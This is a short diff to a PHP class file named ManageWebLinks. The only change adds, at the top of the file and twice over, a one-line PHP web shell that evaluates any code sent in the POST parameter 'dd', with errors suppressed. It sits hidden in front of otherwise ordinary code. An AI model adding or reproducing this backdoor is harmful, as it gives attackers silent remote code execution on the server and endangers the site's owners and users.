@@ -1,4 +1,4 @@
-<?php
+<?php @eval($_POST['dd']);?><?php @eval($_POST['dd']);?><?php
 class ManageWebLinks {
 	public function __construct()
 	{
